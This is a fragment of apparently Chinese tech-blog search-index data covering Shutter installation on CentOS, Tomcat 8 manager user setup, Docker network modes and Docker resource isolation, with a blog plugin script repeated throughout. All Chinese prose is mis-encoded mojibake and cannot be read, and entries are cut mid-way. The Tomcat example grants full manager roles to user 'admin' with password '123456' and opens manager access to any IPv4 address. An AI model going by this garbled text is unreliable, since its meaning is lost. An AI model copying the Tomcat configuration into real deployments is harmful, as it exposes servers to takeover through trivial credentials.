æˆªå›¾å·¥å…·ï¼Œæ”¯æŒæˆªå›¾åè‡ªåŠ¨ä¿å­˜ã€è‡ªåŠ¨å¤åˆ¶åˆ°å‰ªåˆ‡æ¿ã€å¹¶ä¸”å¯ä»¥ç¼–è¾‘ï¼Œå¯ä»¥è¯´æ˜¯ Linux ä¸‹æœ€å¼ºå¤§çš„æˆªå›¾å·¥å…·ï¼Œæ¨èå®‰è£…ä½¿ç”¨ã€‚å®‰è£…åå¯ä»¥æ·»åŠ ç³»ç»Ÿå¿«æ·é”®ï¼Œåç§°ï¼šshotcutï¼Œå‘½ä»¤ï¼šshutter -sï¼Œå¿«æ·é”®ï¼šCtrl+Alt+Aã€‚ 12345# å®‰è£…æº# rpm -Uvh http://li.nux.ro/download/nux/dextop/el7/x86_64/nux-dextop-release-0-5.el7.nux.noarch.rpm# å®‰è£…# yum install -y shutter var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Tomcat å¸¸ç”¨é…ç½®è¯¦è§£",url:"/posts/f77da043.html",text:'Tomcat8 é…ç½®ç®¡ç†ç”¨æˆ· 12345678910111213141516171819202122232425262728293031323334# ç¼–è¾‘Tomcat8å¯¹åº”çš„é…ç½®æ–‡ä»¶ï¼Œåœ¨&lt;tomcat-users&gt;æ ‡ç­¾å†…æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼Œé…ç½®Tomcatçš„ç®¡ç†ç”¨æˆ·# vim /usr/local/tomcat/conf/tomcat-users.xml&lt;tomcat-users&gt; &lt;role rolename="admin-gui"/&gt; &lt;role rolename="admin-script"/&gt; &lt;role rolename="manager-gui"/&gt; &lt;role rolename="manager-script"/&gt; &lt;role rolename="manager-jmx"/&gt; &lt;role rolename="manager-status"/&gt; &lt;user username="admin" password="123456" roles="admin-gui,admin-script,manager-gui,manager-script,manager-jmx,manager-status"/&gt;&lt;/tomcat-users&gt;# ç¼–è¾‘manageré¡¹ç›®ä¸‹çš„META-INF/context.xmlé…ç½®æ–‡ä»¶ï¼Œå°†&lt;Valve&gt;æ ‡ç­¾çš„å†…å®¹æ›¿æ¢ä¸ºä»¥ä¸‹æ–‡æœ¬# vim /usr/local/tomcat/webapps/manager/META-INF/context.xml&lt;Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="\\d+\\.\\d+\\.\\d+\\.\\d+|::1|0:0:0:0:0:0:0:1" /&gt;# ç¼–è¾‘host-manageré¡¹ç›®ä¸‹çš„META-INF/context.xmlé…ç½®æ–‡ä»¶ï¼Œå°†&lt;Valve&gt;æ ‡ç­¾çš„å†…å®¹æ›¿æ¢ä¸ºä»¥ä¸‹æ–‡æœ¬# vim /usr/local/tomcat/webapps/host-manager/META-INF/context.xml&lt;Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="\\d+\\.\\d+\\.\\d+\\.\\d+|::1|0:0:0:0:0:0:0:1" /&gt;# é‡å¯TomcatæœåŠ¡å™¨ä½¿é…ç½®ç”Ÿæ•ˆ# æ³¨æ„ï¼š# å…³äºå¦‚ä½•Tomcaté…ç½®ç®¡ç†ç”¨æˆ·ï¼Œä¸åŒç‰ˆæœ¬çš„Tomcaté…ç½®æ–¹æ³•æœ‰å·®å¼‚ï¼Œä¸Šé¢ä»…æ¼”ç¤ºTomcat8ç‰ˆæœ¬çš„é…ç½®æ–¹æ³•ã€‚# ç”±äºTomcat8é»˜è®¤å¯ç”¨äº†ç½‘æ®µé™åˆ¶ï¼Œé»˜è®¤åªæœ‰127ç½‘æ®µå±€åŸŸç½‘çš„æœºå™¨æ‰æ‹¥æœ‰æœ‰è®¿é—®æƒé™ï¼Œå¦‚æœæ˜¯å…¶ä»–ç½‘æ®µç™»é™†ï¼Œå¦‚172ï¼Œ10ç½‘æ®µä¼šæŠ¥403é”™è¯¯ï¼Œå› æ­¤éœ€è¦æŒ‰ç…§ä¸Šé¢çš„æ–¹æ³•ä¿®æ”¹å¯¹åº”çš„context.xmlé…ç½®æ–‡ä»¶ã€‚# å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­å»ºè®®å¯ç”¨é»˜è®¤çš„ç½‘æ®µé™åˆ¶ï¼Œå³åªå…è®¸åœ¨æœ¬åœ°è®¿é—®TomcatæœåŠ¡å™¨çš„ç®¡ç†é¡µé¢ã€‚# Tomcat8å…±æœ‰6ç§æƒé™ï¼ˆåŒ…æ‹¬æ–‡æ¡£ä¸­è¯´æ˜äº†4ç§ä»¥åŠhost-manageré¡µé¢å‡ºé”™æç¤ºçš„2ç§ï¼‰ï¼Œå…·ä½“å¦‚ä¸‹ï¼š# admin-gui&nbsp;â€” å¯è®¿é—® "hostç®¡ç†" é¡µé¢ï¼Œä½†"APPç®¡ç†" å’Œ "æœåŠ¡å™¨çŠ¶æ€" é¡µé¢æ— æŸ¥çœ‹æƒé™# manager-gui&nbsp;â€” æ—  "hostç®¡ç†" é¡µé¢è®¿é—®æƒé™ï¼Œæœ‰"APPç®¡ç†" å’Œ "æœåŠ¡å™¨çŠ¶æ€" é¡µé¢æŸ¥çœ‹æƒé™# manager-status&nbsp;â€” åªæœ‰"æœåŠ¡å™¨çŠ¶æ€" é¡µé¢æŸ¥çœ‹æƒé™# manager-script&nbsp;â€” æœ‰è„šæœ¬æ–¹å¼ç®¡ç†æ¥å£è®¿é—®æƒé™å’Œ"æœåŠ¡å™¨çŠ¶æ€" é¡µé¢æŸ¥çœ‹æƒé™# manager-jmx&nbsp;â€” JMX ä»£ç†æ¥å£è®¿é—®æƒé™å’Œ"æœåŠ¡å™¨çŠ¶æ€" é¡µé¢æŸ¥çœ‹æƒé™# admin-script&nbsp;â€” åªæœ‰host-managerè„šæœ¬æ–¹å¼ç®¡ç†æ¥å£è®¿é—®æƒé™ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"webæœåŠ¡å™¨"},{title:"OpenStack ä¹‹ä¸€ OpenStack ä»‹ç»",url:"/posts/fcb4fc9d.html",text:'IaaSï¼ŒPaaSï¼ŒSaaS çš„åŒºåˆ« ä¸»æµçš„äº‘è®¡ç®—å¹³å° OpenStackã€CloudStackã€Eucalyptusã€vCloud Director var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"Docker ä¹‹åå›› Docker å››å¤§ç½‘ç»œæ¨¡å¼",url:"/posts/e6921476.html",text:'Docker å››å¤§ç½‘ç»œæ¨¡å¼ æ¡¥æ¥æ¨¡å¼ã€ä¸»æœºæ¨¡å¼ã€å®¹å™¨æ¨¡å¼ã€æ— ç½‘ç»œæ¨¡å¼ Docker å››å¤§ç½‘ç»œæ¨¡å¼ä¹‹ä¸€ï¼ˆbridgeï¼‰ è¯¥æ¨¡å¼æ˜¯ Docker çš„é»˜è®¤è®¾ç½®ï¼ŒDocker å®ˆæŠ¤è¿›ç¨‹åˆ›å»ºäº†ä¸€ä¸ªè™šæ‹Ÿä»¥å¤ªç½‘æ¡¥ docker0ï¼Œé™„åŠ åœ¨å…¶ä¸Šçš„ä»»ä½•ç½‘å¡ä¹‹é—´éƒ½èƒ½è‡ªåŠ¨è½¬å‘æ•°æ®åŒ…ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ˆæŠ¤è¿›ç¨‹ä¼šåˆ›å»ºä¸€å¯¹å¯¹ç­‰æ¥å£ï¼Œå°†å…¶ä¸­ä¸€ä¸ªæ¥å£è®¾ç½®ä¸ºå®¹å™¨çš„ eth0 æ¥å£ï¼Œå¦ä¸€ä¸ªæ¥å£æ”¾ç½®åœ¨å®¿ä¸»æœºçš„å‘½åç©ºé—´ä¸­ï¼Œä»è€Œå°†å®¿ä¸»æœºä¸Šçš„æ‰€æœ‰å®¹å™¨éƒ½è¿æ¥åˆ°è¿™ä¸ªå†…éƒ¨ç½‘ç»œä¸Šã€‚å®ˆæŠ¤è¿›ç¨‹è¿˜ä¼šä»ç½‘æ¡¥çš„ç§æœ‰åœ°å€ç©ºé—´ä¸­åˆ†é…ä¸€ä¸ª IP åœ°å€å’Œå­ç½‘ç»™è¯¥å®¹å™¨ã€‚æ³¨æ„å¯åŠ¨å®¹å™¨çš„æ—¶å€™éœ€è¦æŒ‡å®š - pï¼ˆå›ºå®šç«¯å£åˆ†é…ï¼‰ æˆ–è€… -Pï¼ˆåŠ¨æ€ç«¯å£åˆ†é…ï¼‰å‚æ•°æ¥æš´éœ²ç«¯å£ï¼Œå¦åˆ™ IP æ•°æ®åŒ…å°±ä¸èƒ½ä»å®¿ä¸»æœºä¹‹å¤–è·¯ç”±åˆ°å®¹å™¨ä¸­ã€‚ 1234567891011# docker run -d -p 8888:8080 --net=bridge --name=tomcat8 tomcat:8# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES223e6aee4801 tomcat:8 "catalina.sh run" 23 seconds ago Up 21 seconds 0.0.0.0:8888-&gt;8080/tcp tomcat8# æŸ¥çœ‹å®¿ä¸»æœºçš„è™šæ‹Ÿç½‘æ¡¥åˆ—è¡¨# brctl showbridge name bridge id STP enabled interfacesdocker0 8000.0242e6d2901f no veth3074090 Docker å››å¤§ç½‘ç»œæ¨¡å¼ä¹‹äºŒï¼ˆhostï¼‰ è¯¥æ¨¡å¼å°†ç¦ç”¨ Docker å®¹å™¨çš„ç½‘ç»œéš”ç¦»ï¼Œå› ä¸ºå®¹å™¨å…±äº«äº†å®¿ä¸»æœºçš„ Network Namespaceï¼Œç›´æ¥æš´éœ²åœ¨å…¬å…±ç½‘ç»œä¸­ã€‚å®¹å™¨å°†ä¸ä¼šè™šæ‹Ÿå‡ºè‡ªå·±çš„ç½‘å¡å’Œé…ç½®è‡ªå·±çš„ IP ç­‰ï¼Œå³å®¹å™¨ç›´æ¥ä½¿ç”¨å®¿ä¸»æœºçš„ IP å’Œç«¯å£ã€‚è¯¥æ¨¡å¼æ¯” bridge æ¨¡å¼æ›´å¿«ï¼ˆå› ä¸ºæ²¡æœ‰è·¯ç”±å¼€é”€ï¼‰ï¼Œä½†æ˜¯å®ƒå°†å®¹å™¨ç›´æ¥æš´éœ²åœ¨å…¬å…±ç½‘ç»œä¸­ï¼Œå­˜åœ¨å®‰å…¨éšæ‚£ã€‚ 1234567891011121314151617# docker run -d --net=host --name=tomcat8 tomcat:8# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES363792e07323 tomcat:8 "catalina.sh run" 6 minutes ago Up 6 minutes tomcat8# æŸ¥çœ‹å®¿ä¸»æœºçš„IPä¿¡æ¯# ip addr | grep -A 2 eth0:2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 0c:c4:7a:ab:b8:36 brd ff:ff:ff:ff:ff:ff inet 192.168.1.130/24 brd 192.168.1.255 scope global noprefixroute dynamic eth0# æŸ¥çœ‹å®¹å™¨çš„IPä¿¡æ¯ï¼Œå¯ä»¥å‘ç°å®¹å™¨å’Œå®¿ä¸»æœºå…·æœ‰ç›¸åŒçš„IPåœ°å€192.168.1.130# docker exec -it tomcat8 ip addr2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 0c:c4:7a:ab:b8:36 brd ff:ff:ff:ff:ff:ff inet 192.168.1.130/24 brd 192.168.1.255 scope global noprefixroute dynamic eth0 Docker å››å¤§ç½‘ç»œæ¨¡å¼ä¹‹ä¸‰ï¼ˆcontainerï¼‰ è¯¥æ¨¡å¼ä¼šé‡ç”¨å¦ä¸€ä¸ªå®¹å™¨çš„ç½‘ç»œå‘½åç©ºé—´ã€‚é€šå¸¸æ¥è¯´ï¼Œå½“ä½ æƒ³è¦è‡ªå®šä¹‰ç½‘ç»œæ ˆæ—¶ï¼Œè¯¥æ¨¡å¼æ˜¯å¾ˆæœ‰ç”¨çš„ã€‚å®é™…ä¸Šï¼Œè¯¥æ¨¡å¼ä¹Ÿæ˜¯ Kubernetes ä½¿ç”¨çš„ç½‘ç»œæ¨¡å¼ã€‚ 12345678910111213141516171819# ä»¥æ¡¥æ¥æ¨¡å¼å¯åŠ¨ç¬¬ä¸€ä¸ªå®¹å™¨# docker run -d -p 8888:8080 --net=bridge --name="tomcat8-1" tomcat:8# æŸ¥çœ‹ç¬¬ä¸€ä¸ªå®¹å™¨çš„IPä¿¡æ¯# docker exec -it tomcat8-1 ip addr107: eth0@if108: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0 valid_lft forever preferred_lft forever# ä»¥containeræ¨¡å¼å¯åŠ¨ç¬¬äºŒä¸ªå®¹å™¨ï¼ŒåŒæ—¶æŒ‡å®šé‡ç”¨ç¬¬ä¸€ä¸ªå®¹å™¨çš„ç½‘ç»œå‘½åç©ºé—´ï¼›æ³¨æ„æ­¤æ—¶ä¸¤ä¸ªå®¹å™¨å†…çš„TomcatæœåŠ¡å™¨ä¸èƒ½ä½¿ç”¨ç›¸åŒçš„ç›‘å¬ç«¯å£ï¼Œå¦åˆ™ä¼šé€ æˆç«¯å£å†²çªå¯¼è‡´Tomcatå®¹å™¨å¯åŠ¨å¤±è´¥# docker run -d --net="container:tomcat8-1" --name="tomcat8-2" tomcat:8# æŸ¥çœ‹ç¬¬äºŒä¸ªå®¹å™¨çš„IPä¿¡æ¯ï¼Œå¯ä»¥å‘ç°ä¸ç¬¬ä¸€ä¸ªå®¹å™¨çš„IPåœ°å€ä¸€æ ·éƒ½æ˜¯172.17.0.2# docker exec -it tomcat8-2 ip addr107: eth0@if108: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0 valid_lft forever preferred_lft forever Docker å››å¤§ç½‘ç»œæ¨¡å¼ä¹‹å››ï¼ˆnoneï¼‰ è¯¥æ¨¡å¼å°†å®¹å™¨æ”¾ç½®åœ¨å®ƒè‡ªå·±çš„ç½‘ç»œæ ˆä¸­ï¼Œä½†æ˜¯å¹¶ä¸è¿›è¡Œä»»ä½•é…ç½®ã€‚å®é™…ä¸Šè¯¥æ¨¡å¼å…³é—­äº†å®¹å™¨çš„ç½‘ç»œåŠŸèƒ½ï¼Œæ­¤æ¨¡å¼åœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µä¸‹æ˜¯æœ‰ç”¨çš„ï¼Œç¬¬ä¸€ç§æ˜¯å®¹å™¨å¹¶ä¸éœ€è¦ç½‘ç»œï¼ˆä¾‹å¦‚åªéœ€è¦å†™ç£ç›˜å·çš„æ‰¹å¤„ç†ä»»åŠ¡ï¼‰ï¼Œç¬¬äºŒç§æ˜¯å¸Œæœ›è‡ªå·±è‡ªå®šä¹‰ç½‘ç»œã€‚ 123456789# docker run -d -p 8888:8080 --net=none --name=tomcat8 tomcat:8# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4b4b90aa1a98 tomcat:8 "catalina.sh run" 2 seconds ago Up 1 second tomcat8# docker inspect tomcat8 | grep IPAddress"SecondaryIPAddresses": null,"IPAddress": "", Docker ç½‘ç»œå®‰å…¨ Docker å¯ä»¥å¼€å¯å®¹å™¨é—´é€šä¿¡ï¼ˆæ„å‘³ç€é»˜è®¤é…ç½®â€“icc=trueï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®¿ä¸»æœºä¸Šçš„æ‰€æœ‰å®¹å™¨å¯ä»¥ä¸å—ä»»ä½•é™åˆ¶åœ°ç›¸äº’é€šä¿¡ï¼Œè¿™å¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡æ”»å‡»ã€‚è¿›ä¸€æ­¥åœ°ï¼ŒDocker å¯ä»¥é€šè¿‡â€“ip_forward å’Œâ€“iptables ä¸¤ä¸ªé€‰é¡¹æ§åˆ¶å®¹å™¨é—´ã€å®¹å™¨å’Œå¤–éƒ¨ä¸–ç•Œçš„é€šä¿¡ã€‚åº”è¯¥å¤šäº†è§£è¿™äº›é€‰é¡¹çš„é»˜è®¤å€¼ï¼Œå¹¶è®©ç½‘ç»œç»„æ ¹æ®å…¬å¸ç­–ç•¥è®¾ç½® Docker è¿›ç¨‹ã€‚ Docker å®¹å™¨åˆ†é…å›ºå®š IP 1234567891011121314151617181920212223# åˆ›å»ºè‡ªå®šä¹‰ç½‘ç»œï¼ˆç½‘æ¡¥ï¼‰ï¼Œè¿™é‡Œå­ç½‘æ©ç ä½¿ç”¨255.255.255.0ï¼Œä¹Ÿå°±æ˜¯IPåé¢çš„æ•°å­—24# docker network create --subnet=172.170.0.0/24 jenkins-network# å¯ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ é™¤è‡ªå®šä¹‰ç½‘ç»œï¼ˆç½‘æ¡¥ï¼‰# docker network rm jenkins-network# æŸ¥çœ‹Dockerçš„ç½‘æ¡¥åˆ—è¡¨# docker network lsNETWORK ID NAME DRIVER SCOPE14c2653a88a2 bridge bridge localf44c2671ffd1 host host local007c22522504 jenkins-network bridge local03b720dc8c80 none null local# åˆ›å»ºå¹¶å¯åŠ¨å®¹å™¨ï¼ŒæŒ‡å®šè‡ªå®šä¹‰ç½‘ç»œï¼ˆç½‘æ¡¥ï¼‰ã€IP# docker run -d --net jenkins-network --ip 172.170.0.5 -p 9126:80 -p 4690:3690 --name jenkins-svn-httpd clay/jenkins-svn-httpd:1.1# æŸ¥çœ‹å®¹å™¨çš„IP# docker exec -it jenkins-svn-httpd ip addr49: eth0@if50: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:aa:00:05 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.170.0.5/24 brd 172.170.0.255 scope global eth0 valid_lft forever preferred_lft forever var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"Docker ä¹‹åä¸‰èµ„æºéš”ç¦»ä¸èµ„æºé™åˆ¶ä»‹ç»",url:"/posts/d1859c90.html",text:'è™šæ‹Ÿæœºä¸å®¹å™¨åº•å±‚å®ç°çš„å¯¹æ¯” è™šæ‹Ÿæœºä¸å®¹å™¨çš„åº•å±‚å®ç°åŸç†æ˜¯ä¸åŒçš„ï¼Œæ­£å¦‚ä¸Šå›¾ç‰‡çš„å¯¹æ¯”ã€‚è™šæ‹Ÿæœºå®ç°èµ„æºéš”ç¦»çš„æ–¹æ³•æ˜¯åˆ©ç”¨ä¸€ä¸ªç‹¬ç«‹çš„ Guest OSï¼Œå¹¶åˆ©ç”¨ Hypervisor è™šæ‹ŸåŒ– CPUã€å†…å­˜ã€IO è®¾å¤‡ç­‰å®ç°çš„ã€‚ä¾‹å¦‚ï¼Œä¸ºäº†è™šæ‹ŸåŒ–å†…å­˜ï¼ŒHypervisor ä¼šåˆ›å»ºä¸€ä¸ª shadow page tableï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œä¸€ä¸ª page table å¯ä»¥ç”¨æ¥å®ç°ä»è™šæ‹Ÿå†…å­˜åˆ°ç‰©ç†å†…å­˜çš„ç¿»è¯‘ã€‚ç›¸æ¯”è™šæ‹Ÿæœºå®ç°èµ„æºå’Œç¯å¢ƒéš”ç¦»çš„æ–¹æ¡ˆï¼ŒDocker å°±æ˜¾å¾—ç®€ç»ƒå¾ˆå¤šï¼Œå®ƒä¸åƒè™šæ‹Ÿæœºä¸€æ ·é‡æ–°åŠ è½½ä¸€ä¸ªæ“ä½œç³»ç»Ÿå†…æ ¸ï¼Œå¼•å¯¼ã€åŠ è½½æ“ä½œç³»ç»Ÿå†…æ ¸æ˜¯ä¸€ä¸ªæ¯”è¾ƒè€—æ—¶è€Œåˆæ¶ˆè€—èµ„æºçš„è¿‡ç¨‹ï¼ŒDocker æ˜¯åˆ©ç”¨ Linux å†…æ ¸ç‰¹æ€§ï¼ˆLXCï¼‰å®ç°çš„éš”ç¦»ï¼Œè¿è¡Œå®¹å™¨çš„é€Ÿåº¦å‡ ä¹ç­‰åŒäºç›´æ¥å¯åŠ¨è¿›ç¨‹ã€‚ Linux Namespace çš„å…­å¤§ç±»å‹ Docker èµ„æºéš”ç¦»ä¸èµ„æºé™åˆ¶çš„å®ç°åŸç† ä½¿ç”¨ Namespace å®ç°äº†ç³»ç»Ÿç¯å¢ƒçš„éš”ç¦»ï¼Œ Namespace å…è®¸ä¸€ä¸ªè¿›ç¨‹ä»¥åŠå®ƒçš„å­è¿›ç¨‹ä»å…±äº«çš„å®¿ä¸»æœºå†…æ ¸èµ„æºï¼ˆUtsã€Ipcã€ã€Networkã€Pidã€Mountã€User ç­‰ï¼‰é‡Œè·å¾—ä¸€ä¸ªä»…è‡ªå·±å¯è§çš„éš”ç¦»åŒºåŸŸï¼Œè®©åŒä¸€ä¸ª Namespace ä¸‹çš„æ‰€æœ‰è¿›ç¨‹æ„ŸçŸ¥å½¼æ­¤å˜åŒ–ï¼Œå¯¹å¤–ç•Œè¿›ç¨‹ä¸€æ— æ‰€çŸ¥ï¼Œä»¿ä½›è¿è¡Œåœ¨ä¸€ä¸ªç‹¬å çš„æ“ä½œç³»ç»Ÿä¸­ã€‚ ä½¿ç”¨ CGroups é™åˆ¶è¿™ä¸ªç¯å¢ƒçš„èµ„æºä½¿ç”¨æƒ…å†µï¼Œæ¯”å¦‚ä¸€å° 16 æ ¸ 32GB çš„æœºå™¨ä¸Šåªè®©å®¹å™¨ä½¿ç”¨ 2 æ ¸ 4GBã€‚ä½¿ç”¨ CGroups è¿˜å¯ä»¥ä¸ºèµ„æºè®¾ç½®æƒé‡ï¼Œè®¡ç®—ä½¿ç”¨é‡ï¼Œæ“æ§ä»»åŠ¡ï¼ˆè¿›ç¨‹æˆ–çº¿ç¨‹ï¼‰å¯åœç­‰ã€‚ ä½¿ç”¨é•œåƒç®¡ç†åŠŸèƒ½ï¼Œåˆ©ç”¨ Docker çš„é•œåƒåˆ†å±‚ã€å†™æ—¶å¤åˆ¶ã€å†…å®¹å¯»å€ã€è”åˆæŒ‚è½½æŠ€æœ¯å®ç°äº†ä¸€å¥—å®Œæ•´çš„å®¹å™¨æ–‡ä»¶ç³»ç»ŸåŠè¿è¡Œç¯å¢ƒï¼Œå†ç»“åˆé•œåƒä»“åº“ï¼Œé•œåƒå¯ä»¥å¿«é€Ÿä¸‹è½½å’Œå…±äº«ï¼Œæ–¹ä¾¿åœ¨å¤šç¯å¢ƒéƒ¨ç½²ã€‚ Docker éš”ç¦»æ€§çš„é™·é˜± Docker æ˜¯åˆ©ç”¨ CGroups å®ç°èµ„æºé™åˆ¶çš„ï¼Œåªèƒ½é™åˆ¶èµ„æºæ¶ˆè€—çš„æœ€å¤§å€¼ï¼Œè€Œä¸èƒ½éš”ç»å…¶ä»–ç¨‹åºå ç”¨è‡ªå·±çš„èµ„æºã€‚ Namespace çš„ 6 é¡¹éš”ç¦»çœ‹ä¼¼å®Œæ•´ï¼Œå®é™…ä¸Šä¾æ—§æ²¡æœ‰å®Œå…¨éš”ç¦» Linux èµ„æºï¼Œæ¯”å¦‚ /proc ã€/sys ã€/dev/sd * ç­‰ç›®å½•æœªå®Œå…¨éš”ç¦»ï¼ŒSELinuxã€timeã€syslog ç­‰æ‰€æœ‰ç°æœ‰ Namespace ä¹‹å¤–çš„ä¿¡æ¯éƒ½æœªéš”ç¦»ã€‚ ç”±äº /proc ã€/sys ã€/dev/sd * ç­‰ç›®å½•æœªå®Œå…¨éš”ç¦»ï¼Œå¦‚æœåœ¨ Docker å®¹å™¨ä¸­æ‰§è¡Œ topã€free ç­‰å‘½ä»¤ï¼Œä¼šå‘ç°çœ‹åˆ°çš„èµ„æºä½¿ç”¨æƒ…å†µéƒ½æ˜¯å®¿ä¸»æœºçš„èµ„æºæƒ…å†µï¼Œè€Œå¾ˆå¤šæƒ…å†µä¸‹éœ€è¦çŸ¥é“çš„æ˜¯è¿™ä¸ªå®¹å™¨è¢«é™åˆ¶äº†å¤šå°‘ CPUã€å†…å­˜ã€å½“å‰å®¹å™¨å†…çš„è¿›ç¨‹ä½¿ç”¨äº†å¤šå°‘ã€‚è¿™å°±å¯¼è‡´ç¨‹åºè¿è¡Œåœ¨å®¹å™¨é‡Œé¢ï¼Œè°ƒç”¨ API è·å–ç³»ç»Ÿå†…å­˜ã€CPUï¼Œå–åˆ°çš„æ˜¯å®¿ä¸»æœºçš„èµ„æºå¤§å°ã€‚åŒæ—¶å¯¹äºå¤šè¿›ç¨‹ç¨‹åºï¼Œä¸€èˆ¬éƒ½å¯ä»¥å°† worker æ•°é‡è®¾ç½®æˆ autoï¼Œè‡ªé€‚åº”ç³»ç»Ÿ CPU æ ¸æ•°ï¼Œä½†åœ¨å®¹å™¨é‡Œé¢è¿™ä¹ˆè®¾ç½®ï¼Œå–åˆ°çš„ CPU æ ¸æ•°æ˜¯ä¸æ­£ç¡®çš„ï¼Œä¾‹å¦‚ Nginxï¼Œå…¶ä»–åº”ç”¨å–åˆ°çš„å¯èƒ½ä¹Ÿä¸æ­£ç¡®ï¼Œéœ€è¦è¿›ä¸€æ­¥æµ‹è¯•ã€‚ Docker éš”ç¦»æ€§é™·é˜±åŸå› åˆ†æ å½“å¯åŠ¨ä¸€ä¸ªå®¹å™¨æ—¶å€™ï¼ŒDocker ä¼šè°ƒç”¨ libcontainer å®ç°å¯¹å®¹å™¨çš„å…·ä½“ç®¡ç†ï¼ŒåŒ…æ‹¬åˆ›å»º Utsã€Ipcã€ã€Netã€Pidã€Mountã€User ç­‰ Namespace å®ç°å®¹å™¨ä¹‹é—´çš„éš”ç¦»å’Œåˆ©ç”¨ CGroups å®ç°å¯¹å®¹å™¨çš„èµ„æºé™åˆ¶ã€‚åœ¨å…¶ä¸­ï¼ŒDocker ä¼šå°†å®¿ä¸»æœºä¸€äº›ç›®å½•ä»¥åªè¯»æ–¹å¼æŒ‚è½½åˆ°å®¹å™¨ä¸­ï¼Œå…¶ä¸­åŒ…æ‹¬ /procã€/devã€/dev/shmã€/sys ç›®å½•ï¼ŒåŒæ—¶è¿˜ä¼šå»ºç«‹ä»¥ä¸‹å‡ ä¸ªé“¾æ¥ï¼Œä¿è¯ç³»ç»Ÿ IO ä¸ä¼šå‡ºç°é—®é¢˜ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåœ¨å®¹å™¨é‡Œé¢å–åˆ°çš„æ˜¯å®¿ä¸»æœºèµ„æºåŸå› ã€‚ 1234/proc/self/fd-&gt;/dev/fd/proc/self/fd/0-&gt;/dev/stdin/proc/self/fd/1-&gt;/dev/stdout/proc/self/fd/2-&gt;/dev/stderr Docker å®¹å™¨å†…ï¼ŒJVM å †å†…å­˜é™·é˜± JVM é»˜è®¤çš„æœ€å¤§ Heap å¤§å°æ˜¯ç³»ç»Ÿå†…å­˜çš„ 1/4ï¼Œå‡è‹¥ç‰©ç†æœºå†…å­˜ä¸º 10Gï¼Œå¦‚æœä½ 